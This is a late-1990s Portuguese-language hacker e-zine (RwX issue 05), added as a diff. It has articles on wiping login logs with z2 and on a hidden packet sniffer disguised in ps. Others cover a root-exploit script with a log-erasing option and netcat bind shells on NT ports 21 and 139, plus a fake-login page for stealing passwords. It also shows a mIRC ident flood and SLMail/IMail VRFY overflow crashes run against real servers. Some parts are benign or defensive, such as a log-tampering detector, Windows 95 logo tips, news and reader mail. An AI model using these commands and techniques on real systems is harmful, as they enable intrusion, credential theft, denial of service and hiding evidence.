@@ -1,0 +1,670 @@
+[START]
+----------------------------------------------------------[ rwx05 ]------
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::::::::""`````""::::::""`:.:`""::"`````"::'"```'.:::::
+::::: .g#S$$$$$S#n  .g#S$$     $$S#n. $$$S#s s#S$$$ :::::
+::::: $$$$$$ $$$$$  $$$$$$ $$$ $$$$$$ .  $$$ $$$   .:::::
+::::: $$$$$$g$$$$$. $$$$$$ $$$ $$$$$$ :'  $$g$$   .::::::
+::::: $$$$$$ $$$$$$ $$$$$$ $$$ $$$$$$ ' $$$$ $$$$  ':::::
+::::: $$$$$$  $$$$$ $$$$$$.$$$.$$$$$$ $$$$$ . $$$$$ :::::
+::::: $S$$$$   $$$$ `S$$$$$$$$$$$$$S'.`S$$  :  $$S'.:::::
+:::::.......:.....:::.............:::....:::....:::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+Aqui comeca mais uma Read Write eXecute , a sua RwX!
+----------------------------------------------------------[ rwx05 ]------
+
+Zine
+----
+http://www.rwx.ml.org (Home page Oficial)
+http://www.cyberspace.org/~rwx (Mirror nos eua)
+http://www.necroterium.com.br/rwx (Mirror no brasil - Desatualizada)
+http://sua.home.page/rwx (Aceitamos mirros , desde que nos avisando antes
+de botar :))
+
+email RwX   : rwx@sekurity.org (Yes , esse mesmo!:))
+
+ATENCAO : rwx@null.net esta invalida agora.Por favor nao mande mais emails
+(Free trial version sux!:))
+
+Sexta edicao , lancada em :                       as
+
+----------------------------------------------------------[ rwx05 ]------
+
+Introducao
+----------
+
+         Aloha amigos...Estamos aqui com a sexta (rwx05) edicao de nossa
+zine. Espero que esteja ao seu agrado. Bem aconteceu varias coisas nesse
+comeco de ano , a primeira eh que a zine nao eh mais mensal e nao tem
+publicacao definida , mas o intervalo entre as zines sera de mais ou menos
+50 dias. E , estamos tenho trabalho em continuar. Muitos editores nossos
+sumiram , muitos problemas pessoais , por isso estamos pensando em
+reestruturar o grupo. O nosso email rwx@null.net encerrou (foda esses
+servicos gratuitos) e quem quiser fazer um alias rwx na sua maquina com um
+host legal nos aceitamos :) (mande email pliz). Varios inovacoes nessa
+zine. Infelizmente o dms saiu do nosso grupo , mas quando ele quiser
+escrever alguma coisa , viu dms , pode mandar pra nos!:). Estamos
+com um novo sistema de menu , basicamente feito por X-Satanic , ele pega
+os arquivos e gera um index automatico e lee as materias usando seu
+editor preferido. Estamos recebendo ate uma remessa ate razoavel de email,
+e nao estamos respondendo a todos , pois os repetitivos tento botar na zine.
+Se quiser ajuda na configuracao e seguranca de seu linux podemos ajudar ,
+so mandar email , na medida do possivel iriamos retornar o seu email.
+
+KByte e toda rwx
+
+----------------------------------------------------------[ rwx05 ]------
+
+Linkz do MES
+------------
+http://www.nearz.home.ml.org - Zine Near(Z). Nivel ate bom . :)
+
+http://www.zdgree.com.br  -  Firma de desenvolvimento de software e
+webhosting. De um amigo nosso
+
+http://www.rootshell.com - Exploits , e muita info mesmo. O Wingate desde
+rwx esta por la tb.:)
+
+----------------------------------------------------------[ rwx05 ]------
+
+Diretorios
+wgate : Wingate Seeker Projeto
+progs : programas da rwx05
+misc  : outros arquivos
+
+----------------------------------------------------------[ rwx05 ]------
+
+INDEX
+-----
+
+Alterando e checando logs.....................................Anarchy
+Mirc 5.3 ident bug............................................X-Satanic
+Sniffing......................................................KByte
+Super Exploit.................................................KByte
+Wingate Seeker................................................KBtte
+Personalizando Win95(Argh)....................................Anonymous
+SECAO NT
+Bind Shell no WinNT...........................................X-Satanic
+SLmail 2.6 e Imail............................................X-Satanic
+END SECAO NT
+News..........................................................RwX
+Mails.........................................................RwX
+
+----------------------------------------------------------[ rwx05 ]------
+Alteracao de Logs por Anarchy - RwX 05
+Logs alterados
+===============
+by AnArChY
+
+hi all!!
+To aqui de novo pra ve se dou mais forca aos admins :]
+Tenho certeza que essa materia vai agradar muitos portanto vamos la! ;)
+Um rapaz que invadir sua maquina iria apagar seus rastros na sua maquina
+com certeza assim que pegasse root.
+Um dos melhores e mais usados de se apagar logs eh o programa z2.c ele vai
+anexado com a zine.
+
+bom... compile com com cc -o z2 z2.c agora faca um teste em sua maquina:
+
+HellsBells:~/z2# w
+USER     TTY      FROM              LOGIN@  IDLE   JCPU   PCPU  WHAT
+paulo     tty1                      12:47am  6:35   0.29s  0.03s  bash
+
+HellsBells:~/z2# z2 paulo ---> usuario que vc esta logado
+Entrada paulo apagada
+HellsBells:~/z2# w
+USER     TTY      FROM              LOGIN@  IDLE   JCPU   PCPU  WHAT
+HellsBells:~/z2#
+prontu! logs apagados.... pra vc ver o usuario naum fica logado no
+sistema. mas naum esqueca que so funciona se tiver rootiado a maquina.
+
+logs.c
+------
+Agora a coisa reverte peguei um programinha na net que ele analisa o
+wtmp,utmp,lastlog e diz se foi alterado, sendo um combate contra esse tipo
+de programa como o z2. Naum sei quem eh o autor. O programa chama logs.c e
+vem junto com a zine.
+
+compile cc -o log log.c e tchan! vc vai ver se seus logs foram alterados e
+por qual user foi alterado. ex:
+
+HellsBells:/# logs -h
+======RwX Labs 1998=====
+Uso: logs [-opcoes]
+        -h imprime este help e sai
+        -b beep ao encontrar anomalias
+        -u apenas testa utmp
+
+HellsBells:/# logs -b
+Mon Mar 17 03:52:29 1997
+
+Analizando entradas do 'utmp'...
+OK!
+----------------------------------
+
+Analizando entradas do 'wtmp'...
+OK!
+----------------------------------
+Analizando entradas do 'lastlog'...
+Utilizadores com entradas 'apagadas':
+-> paulo
+
+Foram apagadas pelo menos 1 entradas
+HellsBells:/#
+ta ai mocada o usuario paulo que usou o z2 no exemplo do comeco para
+apagar os logs foi pego pelo programa. Agora eh so pegar os mininos :]
+
+AnArChY
+(Participacao Especial :))
+------------------------------------------------------------[ rwx05 ]-----
+
+Mirc 5.3 ident bug
+por X-Satanic
+
+** A Win95/NT Thing:
+
+*       *       *
+# mIRC 5.3 Bug
+*       *       *
+
+A versao 5.3 do mIRC(16/32bits), como a maioria dos programas que atuam na
+NET feitos pra Windows tem um grande bug! =]
+Um DOS soh a masssa! hjeueue =]
+eh muito simples...
+se voce abrir 6 conexoes para a porta 113 de um cara quem tah usando
+mIRC5.3, o mIRC dele fica tipo, como se tivesse consumindo 100% da
+memoria... isso se ele nao travar! =]
+Tudo isso, e' questao de um problema entre o mIRC5.3 e o identd server
+o mais interessante de tudo, e' que as versoes anteriores nao apresentam
+esse problema! :)
+Se no ID do cara tiver tipo: ~blah em vez de blah, isso quer dizer
+que ele nao esta rodando o identd server, portanto, nao e' vulneravel.
+
+------------------------------------------------------------[ rwx05 ]-----
+
+Sniffer
+by KByte
+--------
+        Esta materia eh so para poder explicar o programa linsniffer
+que eu adaptei e adicionei alguns add ons , hehe , o programa esta no dir
+progs , chamado linsniffer , greetz para Mike Edulla <medulla@infosoc.com>
+que fez o codigo base.
+	O que esse codigo tem de mais?Bem , ele basicamente tem tres
+coisas que nunca vi em um outro sniffer. Compile o sniffer <gcc -o
+linsniffer linsniffer.c> e entao rode ./sniffer. Ele primeiro pedira o
+device para sniffar , no caso pode ser usado eth0 , ppp0 , o que vc tiver
+rodando na sua maquina.<De um ifconfig e descubra os devices que estao
+rodando>.Digite por exemplo eth0 e de enter
+
+bash#./linsniffer
+Entre com o nome do device (ppp0 , eth0 , etc) eth0
+
+apos isso ele pedira o arquivo de log , isto eh , aonde as informacoes vao
+ficar gravadas. Por exemplo , vamos botar /tmp/.log
+
+Entre com o arquivo de LOG /tmp/.log
+
+Apos isso teremos uma terceira pergunta , como vc quer que seu sniffer
+aparece no ps. Escolha um servico comum como httpd e depois veja o
+resultado
+
+Como voce quer que seu processo apareca no PS (httpd ,pine) http
+
+Apos isso , a tela ficara negra , pronto , seu sniffer esta rodando , para
+retornar a shell , aperta ctrl + z e na shell digite
+bash# bg
+
+Entao seu sniffer esta no sistema rodando , dee um ps , ele eh 'invisivel'
+no ps , isto eh , aparece como outro processo
+
+bash#ps -aux
+ ....
+ 1065   5 S    0:00 httpd
+ ...
+
+       E vejam , o seu sniffer rodando com o nome que vc quiser.
+Bem , falta de tempo , por essa edicao eh so , vejo se da pra fazer uma
+materia melhor sobre sniffing na outra rwx. Desculpa pra quem eu prometi
+nessa rwx...:P
+
+KByte
+kbyte@biogate.com
+
+-------------------------------------------------------[ rwx 05 ]-----
+
+Super Exploit
+by Kbyte
+-------------
+
+Nesta zine , ira um shell script que eu fiz , baseado no Soltool de so1o ,
+adaptando para Linux e usando alguns xploits mais comuns. Ele pode tentar
+rootiar sua maquina para motivos educacionais , ou pode arrumar alguns
+bugs conhecidos dela , inclusive testar sua maquina se ela eh afetada pelo
+Intel BUG. O Sxploit vai junto no .zip da zine , para usar digite :
+chmod +x Sxploit
+./Sxploit
+e o programa ira lhe mostrar as sintaxes , vamos a elas
+
+ .o. Usage: ./Sxploit -scan    :  Scans for vulnerable programs
+ .o.        ./Sxploit -root    :  Exploits vunerable programs
+ .o.        ./Sxploit -fix     :  Fix vunerable programs
+ .o.        ./Sxploit -crash   :  Try to crash machine
+ .o.        ./Sxploit -clean   :  Clean Up your mess on tmp
+ .o.        ./Sxploit -inv     :  How about getting off logs?
+ .o.        ./Sxploit -info    :  Info about this proggie
+
+-scan  = Faz um reporte no dir /tmp sobre as vulnerabilidades do seu
+sistema. Ver /tmp/report
+-root  = Tenta Xploits que sua maquina parece ser vulneravel.
+-fix   = Arruma os xploits que sua maquina parece ser vulneravel
+-crash = Tenta o Pentium BUG na sua maquina.Se ela travar pegue um kernel
+maior do que 2.0.31 na ftp://sunsite.unc.edu/pub/Linux/kernel/v2.0
+-clean = Apaga logs reports e arquivos de configuracao do dir /tmp
+-inv   = Se voce for root , podera desaparecer dos logs (Somente para
+motivos educacionais)
+-info  = Info sobre o programa
+
+       O que vc quer que faca com esse prog , nao eh problema meu , ao
+usa-lo voce fica ciente de que tudo o que vc causar sera exclusivamente
+problema SEU. Exploits novos que sairem , por favor me mandem para eu
+fazer novas versoes do Sxploit.
+Bugs , Duvidas , sugestoes , etc :
+
+KByte@biogate.com
+------------------------------------------------------------[ rwx05 ]-----
+
+Wingate Seeker
+by KByte
+--------------
+
+=========================================================================
+Wingate Seeker                                                  por KByte
+=========================================================================
+Este programa foi escrito por mim e por um amigo meu Mandarin (Valeu
+mano!). Ele procura em um arquivo por Wingates Answers. Esse programa
+podera ser facilmente modificado para achar outros sistemas , versoes de
+prog etc , depende da sua imaginacao. Por favor , se voce modificar esse
+prg e ele se tornar realmente util , me mande uma copia :)
+OBS : Nao eh bem um programa , pois ele precisa de outro prg para gerar a
+lista se vc nao quiser fazer a mao.Incluo tb na zine o classc.c e o
+classb.c que geram listas de Classe C ou de Class B para serem usados com
+o wgate.c.
+Use o classc.c e o classb.c como quiserem. Boa sorte.
+
+------------------------------------------------------------[ rwx05 ]-----
+
+Personalizando seu Win95
+(Anonymous)
+------------------------
+==========================================================================
+Personalizando seu Windows 95                                   por alguem
+==========================================================================
+
+      Eu sei que essa materia pode parecer meio fora do estilo da zine ,
+mas vamo tirar um pouco do logo microsoft do windows.:).
+
+*   Tela de apresentacao do windows95.
+   A tela que voce ve quando abre o windows , nao eh mais do que uma
+figura de 256 cores em formato bitmap.Para muda-la voce podera
+simplesmente modifica-la ou acrescentar um bmp de sua preferencia.
+Este arquivo geralmente eh o c:\logo.sys . De um attrib c:\logo.sys e ve
+se ele tem algum modo tipo s , h ou r , se tiver de attrib c:\logo.sys
+-shr e pronto.
+Voce podera modifica esse logo.sys diretamente do paint ou outro programa,
+(As vezes tera que copiar pra um arquivo .bmp e depois abri-lo).Se voce
+quiser botar um bmp no lugar basta apenas copiar o .bmp para c:\logo.sys
+sem nenhum tipo de conversao.:)
+*   Telas de Saida
+  As telas de saida (Please wait... e Now you can...) estao no diretorio
+do windows com o nome logow.sys e logos.sys respectivamente. Use o mesmo
+esquema do logo.sys para esses dois e delicie-se com seu Win95 com menos
+Microsoft espaiados no seu computador .
+
+------------------------------------------------------------[ rwx05 ]-----
+
+Gerador de WordList
+~~~~~~~~~~~~~~~~~~~
+        by Int20h (int20h@zdgree.com.br)
+
+  Yo all, e' a primeira vez que estou escrevendo para a rwx  e se tiver
+uma boa aceitacao.. quem sabe eu escreva mais. :)
+  Essa minha primeira materia e' apenas para apresentar um programinha
+muito util para quem usa programas como SATAN, JOHN, JACK, ARJ-ATTACK,
+Cracker Hack ou qualquer outro que necessite de um dicionario de palavras.
+O dicgen foi originalmente  desenvolvido em  pascal mas por problemas de
+hd, perdi o codigo fonte  e so'  o refiz  ha alguns meses atras,  mas C.
+O novo codigo fonte vem em anexo, e' o  dicgen.c.  A funcao principal e'
+o MakeDic() e e' bem "grandinha".  O motivo de  ter uma rotina tao gigante
+e' porque estava pensando na velocidade e  nao no tamanho. Se eu colocasse
+uma rotina pequena mas repleta de condicoes (if), o programa ficaria duas
+vezes mais lento.
+  Creio que o  programa sera muito util para novos programadores que
+querem aprender C e pra quem quer simplesmente um bom e rapido gerador de
+wordlist Estejam livres  para modificar  ou distribuir o codigo, esta sob
+licenca do GNU. Quem quiser visualizar a licenca, procure em www.gnu.org
+ou em seu proprio linux.
+  Para qualquer mensagem, duvida, critica, ajuda, ou sejah lah o que for,
+esteja livre para me mandar um email. :)
+
+[Dicgen.README]
+
+Dicgen 1.00, inclue uma grande opcao para aqueles que nao possuem muito
+espaco em disco, etc. Isso e' muito bom, quando usado principalmente com
+numeros. Dicgen inclue a opcao: -STDOUT , isso manda as palavras feitas,
+nao para um arquivo de output, mas sim, para o buffer de saida, sem ocupar
+espaco no HD. Bem, o John (cracker que uso) tem uma opcao chamada: -stdin
+isso o faz ler palavras direto do stdout, entao, em vez de usar os
+randomicos e demorados -i:Digits, -i:Alpha etc... pode-se usar:
+
+c:\>dicgen -STDOUT | john -stdin pwdfile         ou
+bash# ./dicgen -STDOUT | ./john -stdion pwdfile
+
+Algumas sintaxes comuns:
+
+* dicgen
+usara as configuracoes do dicgen.cfg, caso nao exista, sera criado, com
+defaults, as palavras geradas serao escritas para o 'out.dic' (default).
+
+* dicgen dic.txt
+usara as configuracoes do dicgen.cfg, caso nao exista, sera criado, com
+defaults, palavras geradas serao escrita para o 'dic.txt'.
+
+-------- Observacoes:
+o dicgen.cfg eh um arquivo que deve ser editado por voce e que vai
+incluso, mas caso nao o tenha, ele e' gerado altomaticamente, quando nao
+e' encontrado!
+
+                                                   - God Save the For() -
+                                                            anD
+
+                                                   -  Dem fuck the GOTO -
+
+------------------------------------------------------------[ rwx05 ]-----
+
+Bind Shell no NT
+por X-Satanic
+----------------
+                           RWX NT LABS.
+
+*             **                *
+* # BIND Shell no NT   - Bindin *
+*             **                *
+
+[credits: L0pht Heavy Industries and NTSD]
+
+Bem, como todo sistema, e' possivel bindear 'uma shell' em um NT, para
+isso, e' soh vc logar lah e pronto hehhe! =]
+Alem de tudo, ainda e' possivel bindear para uma porta que esta sendo
+usada por outro servico, como a 139, 113 etc.
+Como isso e' possivel?
+usando o NetCat para NT. Desenvolvido pela L0pht Heavy Indrustries
+http://www.l0pht.com/~weld/netcat/
+NetCat e' um ferramenta muito util, para por exemplo: pegar o HTML Code de
+uma home-page rapidamente, e bindear um shell nesse caso ;-)
+o NetCat tem muitas utilidades mesmo...
+para ver outras funcoes do NetCat, de uma olhada no README.TXT que
+acompanha o programa =]
+Tudo que vc precisa saber, usando netcat por enquanto eh:
+
+-v: Verbose, mostrar mais informacoes quando de faz uma conexao
+-l: "Listen" = ficar esperando conexoes
+-L: Listen + Reiniciar NetCat quando uma conexao e' fechada
+-p [porta]: Porta para esperar
+-t: trabalhar com qualquer servico telnet, que o client pode usar.
+-e: executar programa no client
+-s: Source IP ... quando vc vai bindear numa porta de NETBIOS, use isso
+para dar prioridade ao NC
+
+Se voce pensar um pouco, pode ver que juntando isso, dah pra bindear um
+shell na maior (e' nada...).
+Ah.. e' bom lembrar que o NetCat tb serve com telnet! uheiue
+realmente versatil nao?!
+oia soh:
+D:\> nc -l -p 21 -t -e cmd.exe
+CMD.EXE e' o arquivo que serah executado, como se voce o /bin/bash
+D:\> nc 127.0.0.1 21
+...
+Esta logado!
+...
+Seu nivel de usuario sera: NT AUTHORITY\SYSTEM.
+Outra coisa interessante, e' usar o nc para bindear num servico de
+NETBIOS, desabilitando assim o mesmo...
+alem de um shell! heuheue =]
+vamos bindear para a porta 139, que existe na maioria dos NTs.
+A 139 e' a NETBIOS que cuida dos Sharings.
+vamo lah:
+nc -v -L -p 139 -e cmd.exe -s 127.0.0.1
+|   |  |  |      |          |
+|-->| Executavel |--> executar cmd.exe
+    |  |---> Listen e Restart
+    |--> Verbose            |--> source [ip da makina] (prioridade ao NC)
+          |
+          |--> porta [139]
+Pronto! o File Sharing esta desligado... e tb telnet pra 139 = shell!
+Reboot na maquina, se voce quiser Sharing File travez! =]
+Bem, se voce usar um pouco a cabeca, isso pode servir para muitas outras
+coisas...
+imaginemos que voce faca um programa que mostre em HTML algo do tipo:
+[-- Area restrita a usuarios --]
+[Login:                        ]
+[Senha:                        ]
+[ (OK)                 (LIMPAR)]
+[------------------------------]
+e grave tudo isso para algum arquivo de log.
+certo certo... e ai?
+bem, facamos de conta que o nome desse programa eh: fakelog.exe
+agora, poderiamos fazer o seguinte:
+nc -v -L -p 80 -e fakelog.exe -s ip.ip.ip.ip
+Quando o usuario tentar acessar a home-page do provedor... seria executado
+o programa fakelog.exe ... ai blah blah blah =]
+Com um pouco de tutano, e' possivel simular servico, redirecionar etc.
+=]
+FIX:
+eu nao encontrei realmente.. FIXes, tudo que vc pode fazer e' ir olhando
+de vez em quando os servicos que estao rodando, verificar as portas
+ativas, etc.
+
+---------------------------------
+# Bind Shell on NT - SMB Problem
+---------------------------------
+E' possivel atraves de bind, redirecionar o servico de samba de uma
+maquina para outra!
+o programa vai include no zine
+obs: eh necessario perl5 instalado para poder rodar o programa.
+---
+use: perl redirect.pl <local ip - victim> <dest ip>
+
+------------------------------------------------------------[ rwx05 ]-----
+
+SLmail 2.6 e IMail
+por X-Satanic
+------------------
+
+*         **         *
+# SLMail 2.6 & IMail #
+*         **         *
+
+OBS: Bug tb presente no IMail4.03, talvez em outros SMTPs, ftps etc! =]
+
+Que merda.. os caras da SeattleLabs num aprendem mermo......
+6 lembram daquela materia do minha.. do SLMail 2.5?
+de mandar uma string bem grande e tal?
+poise... se nao lembram, vao atras de ler...
+mas agora, a porra da SeattleLabs fez o SLMail 2.6, o que ele tem de bom?
+vem com todos os bugs updateados, ou seja os bugs sao mais novos hehe! =]
+saka soh:
+rwx:~# telnet www.slmail-sux.com 25
+Trying 1.2.3.4...
+Connected to www.slmail-sux.com.
+Escape character is '^]'.
+220 SlMail-Sux Smtp Server SLMail v2.6 Ready ESMTP spoken here
+vrfy rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+     rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxx
+Connection closed by foreign host.
+rwx:~# telnet www.slmail-sux.com 25
+Trying 1.2.3.4...
+telnet: Unable to connect to remote host: Connection refused
+rwx:~#
+agora vamos mostrar o mesmo caso com o IMail4.03:
+
+OBS: ESPERO QUE O ADMIN DESSE SERVER AQUI SE MANQUE...
+
+rwx~:# telnet ##c.####el.com.br 25
+Trying 200.2#9.1##.34...
+Connected to ##c.####el.com.br.
+Escape character is '^]'.
+220 X1 NT-ESMTP Server ##c.####el.com.br (IMail 4.03 5-1)
+vrfy rwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxrwxr
+wxrwxrwxrwxrwxrwxrwxrwxrwx
+Connection closed by foreign host.
+rwx~:# telnet ##c.####el.com.br 25
+Trying 200.2#9.1##.34...
+telnet: Unable to connect to remote host: Connection refused
+
+##
+-- SE VC E' ADMIN DO SERVER ACIMA, NAO SE SINTA OFENDIDO!
+##
+
+Eu fiz o contrario depois, usei o SLMail2.6, e dei telnet pra minha
+propria makina, huheiue =]
+e' realmente interessante quando o slmail trava! =]
+
+----------------------------------------------------------[nt3.end]------
+                  -- #included by <X-SaTaNiC> --
+          -------      w0x5002w@hotmail.com       ---------
+------------------------------------------------------------[ rwx05 ]-----
+
+----------------------------------------------------------[rwx 05]------
+
+News - RwX 05
+-------------
+
+Secao news :
+
+* A zine Axur05 esta de volta - Interessante , os cabras voltaram , agora
+parecem que tomaram jeito e estao com um novo zine de alta qualidade e
+realmente aparentam terem tomado juizo. Aposto que assim o zine vai render
+mais. Nos nao temos nada contra eles , e acho que eles nao tem nada contra
+nos e por eles serem conhecidos entre os infomaniacos por terem um
+linguajar direto , estamos fazendo uma propaganda deles :)
+Site - http://www.axur05.org
+
+* Porque os EUA estao na nossa frente - O presidente americano , William
+Clinton , fez um anuncio que fara o eua continuar lider no 'tech world'.
+Este anuncio envolve manter a InterNET sem taxas , e oferencendo
+privilegios para conectar universidades na InterNet
+[Bem que o Brasil podia roubar mais essa ideia americana...]
+
+* NASA, MIT, the Navy, Kennedy Space Center hackeados - 'Crackers' nao
+identificados derrubaram as maquinas de mais de 20 maquinas high-tech ,
+militares e universidades , usando o 'blue screen of death' (OOB) em
+maquinas rodando WinNT e Win95 .
+Nao , nao adianta usar os conhecidos exploits :).Acontece que esses
+hackers descubriram alguma forma de burlar o fix da microsoft ou
+aperfeicoaram o antigo ataque.
+
+* Grupo Sexta Feira 13 - Esse grupo brasileiro entrou em varios hosts
+brasileiros , e fazem pedidos meio absurdos como Toda crianca na escola
+etc , eles ameacam derrubar a RNP e Embratel. Espero que nao facam isso.
+Noticiado em varios Jornais. Grupo formado por Spin (Ja havia entrado na
+global-one americana dias atras) , smux , e _blast_ como aparecem na
+pagina hackeada.Hackearam sites militares , governamentais e comerciais.
+
+--------
+ Rapidas
+--------
+* Pentium II 333 mhz em fase de desenvolvimento
+* Mozilla retorna. Netscape libera codigo do Mozilla
+* Notebook de U$$ 999,00 da compaq lancado
+
+----------------------------------------------------------[ rwx05 ]------
+
+Mails de leitores - RwX 05
+
+Mails
+-----
+
+Aqui algums emails selecionados
+
+--------------------------------------------------------------------------
+
+From : walter@xxxx.xxx.br
+
+Eu nao saberia da existencia desse zine se nao fosse o Skynet, agradeco a
+ele o q ele me deu (os numeros da revista) . Progredi muito com as
+informacoes la contidas
+[Valeu skynet..hehehe]
+
+--------------------------------------------------------------------------
+
+From : KilLLeRsKaTeR
+
+Caras... essa zine ta mui bem explicada...
+1a. vez que entendo o jizz e outras coisas...
+Continuem assim e escrevam mais sobre NT... to querendo aprende tb.
+
+Valeu ae...
+                                K-S
+[Mais sobre NT nessa secao.Valeu]
+
+----------------------------------------------------------------------------
+
+From : paterson@xxxxxx.xxx.br
+
+OBRIGADO POR TUDO....
+MUITO OBRIGADO....MESMO..
+
+[De nada]
+
+-----------------------------------------------------------------------------
+
+From: Gambit <damasco@xxxxxx.xxxx.br>
+
+Oi editores desse Super, Hiper-Zine... Galera o negocio =E9 o seguinte
+queria saber como eu consigo o Linux ou o Linux e quanto custaria???
+Queria saber se nao tem jeito do cara pegar sem ter que pagar...
+
+Valeu []
+
+[ftp://ftp.matrix.com.br/pub/mirrors/redhat tem o redhat 5.0. O linux eh
+distribuido gratuitamente , algumas empresas cobram , mas geralmente eh
+pela taxa de postagem , etc ...falow ]
+
+-----------------------------------------------------------------------------
+
+From : RosS
+
+Ae galera da RWX, qual eh o atual endereco do ZINE?
+
+Ate mais.
+
+RosS.
+
+[http://www.rwx.ml.org . Sempre que sair a zine , vai pra la ..]
+
+----------------------------------------------------------------------------
+
+From : Phillipe <gomes@xxxxx.xxx.br>
+
+Sera que c podia me mandar alguma materia sobre senhas 0800?  elas sao
+pegas por eng social ou hackeadas mesmo?
+                       Falou, beleza
+
+[Senha 0800 ? Voce deve estar se referindo a provedores com numero 0800.
+Isto nao eh um zine hacker e sim de seguranca...]
+
+-------------------------------------------------------------------------
+[END HERE]
